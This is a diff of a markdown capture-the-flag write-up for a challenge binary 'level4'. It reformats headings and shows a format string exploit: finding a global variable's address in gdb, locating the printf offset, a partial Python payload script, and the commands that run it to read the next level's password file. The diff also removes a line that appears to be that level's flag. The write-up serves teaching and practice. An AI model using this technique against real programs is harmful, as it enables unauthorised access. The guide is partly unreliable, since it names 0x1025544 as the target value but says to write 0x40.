@@ -1,8 +1,6 @@
-LEVEL_4:
-# 📚 Exploiting `level4` – Format String Vulnerability to Overwrite Global Variable
+<h1 align="center"> LEVEL 4 </h1>
 
-## 🔍 Challenge Summary
-
+## 🔍 Analysis of Decompiled [level4](./source.c)
 The target is a vulnerable binary named `level4`. Our goal is to:
 
 - Exploit a **format string vulnerability** in `printf()`
@@ -10,7 +8,7 @@ The target is a vulnerable binary named `level4`. Our goal is to:
 - Satisfy the condition `if (m == 0x1025544)` to execute ` system("/bin/cat /home/user/level5/.pass")`
 
 
-## 🔐 Binary Protections
+### 🔐 Binary Protections
 
 ```bash
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -36,28 +34,28 @@ void n(void)
 }
 
 ```
- ## Exploitation Strategy
+## 💥 Exploit 
 
-    Leak stack contents to determine the correct format string offset
-    Use %n to write 0x40 to the address of the global variable m
-    Trigger the condition and gain a shell
+Leak stack contents to determine the correct format string offset
+Use %n to write `0x40` to the address of the global variable m
+Trigger the condition and gain a shell
 
-##  Step 1: Find the Address of m
+###  Step 1: Find the Address of m
 
-```
+```sh
 (gdb) p &m
 $1 = (int *) 0x08049810
 ```
-## Step 2: Discover Format String Offset
+### Step 2: Discover Format String Offset
 
-```
+```sh
 for i in $(seq 1 40); do
   python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
 done
 ```
-Look for 41414141 in the output. appears at %11$x, that means the offset is 11.
-## Step 3: Exploit Script (Python)
-```
+Look for `41414141` in the output. appears at `%11$x`, that means the offset is 11.
+### Step 3: Exploit Script
+```py
 import struct
 import sys
 
@@ -85,11 +83,10 @@ print("Wrote payload with offset %d" % offset)
 
 
 ```
-## Step 4: Execute the Exploit
-
-> python exploit.py 11 </br>
-> (cat payload.txt; cat) | ./level4
+### Step 4: Execute the Exploit
 ```
-b7ff26b0
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+python exploit.py 11 </br>
+(cat payload.txt; cat) | ./level4
+$ whoami
+level4
 ```
